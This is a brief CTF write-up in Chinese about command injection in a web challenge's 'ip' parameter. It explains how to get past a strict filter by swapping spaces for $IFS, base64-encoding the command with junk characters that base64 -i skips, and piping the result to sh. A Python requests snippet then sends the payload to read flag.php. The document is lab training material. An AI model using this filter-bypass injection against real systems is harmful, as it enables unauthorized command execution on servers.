tags:: CTF/RCE

- # 思路
	- 普通强过滤shell RCE
	- 可以通过base64解码加sh执行绕过RCE
	- 为了执行`base64 -d`我们可以使用`$IFS`替代空格，为了echo我们的base64 payload我们可以加上一些垃圾字符，然后用base64的`-i`选项让其忽略掉这些垃圾字符
- # payload
	- ```python
	  payload = enc_dec.base64_encode("cat flag.php")
	  payload = f"1145141919810;echo$IFS-_-{payload}|base64$IFS-id|sh"
	  r = requests.get(url, params = {
	      "ip": payload
	  })
	  r.encoding = r.apparent_encoding
	  print(r.text.strip())
	  
	  ```